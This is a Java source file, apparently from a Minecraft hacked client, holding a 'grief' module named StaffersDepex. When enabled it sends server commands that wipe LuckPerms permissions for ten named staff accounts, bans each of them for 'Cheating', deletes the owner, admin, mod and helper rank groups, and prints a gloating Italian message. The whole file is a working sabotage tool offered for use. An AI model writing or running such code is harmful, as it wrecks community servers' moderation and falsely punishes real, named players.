package it.thatskai.aragosta.module.grief;

import it.thatskai.aragosta.annotations.modules.IModule;
import it.thatskai.aragosta.annotations.modules.Module;
import it.thatskai.aragosta.module.Category;
import it.thatskai.aragosta.utils.MessageUtils;

import java.util.ArrayList;
import java.util.List;

@IModule(
        name = "StaffersDepex",
        key = 0,
        category = Category.GRIEF
)
public class StaffersDepex extends Module {

    @Override
    public void onEnable() {

        List<String> nicks = new ArrayList<>();
        nicks.add("itx_miji");
        nicks.add("ManuelitosOG");
        nicks.add("xMattix06");
        nicks.add("Leonardomig0");
        nicks.add("matt1a_");
        nicks.add("Il_KconlaC");
        nicks.add("179hz");
        nicks.add("_3zq");
        nicks.add("MattywIsBackNow");
        nicks.add("MatrixDavino");


        for(String n : nicks){
            mc.thePlayer.sendChatMessage("/lpb user " + n + " clear");
            mc.thePlayer.sendChatMessage("/lp user " + n + " clear");

            mc.thePlayer.sendChatMessage("/ban " + n + " Cheating (SS)");
        }

        List<String> ranks = new ArrayList<>();
        ranks.add("owner");
        ranks.add("coowner");
        ranks.add("co-owner");
        ranks.add("sradmin");
        ranks.add("admin");
        ranks.add("mod");
        ranks.add("srmod");
        ranks.add("helper");
        for(String r : ranks){

            mc.thePlayer.sendChatMessage("/lp deletegroup " + r);
            mc.thePlayer.sendChatMessage("/lpb deletegroup " + r);

        }

        ranks.clear();
        nicks.clear();


        MessageUtils.sendMessage("&7Hai tolto i permessi allo staff (godiamo!)", false);
        toggle();
    }
}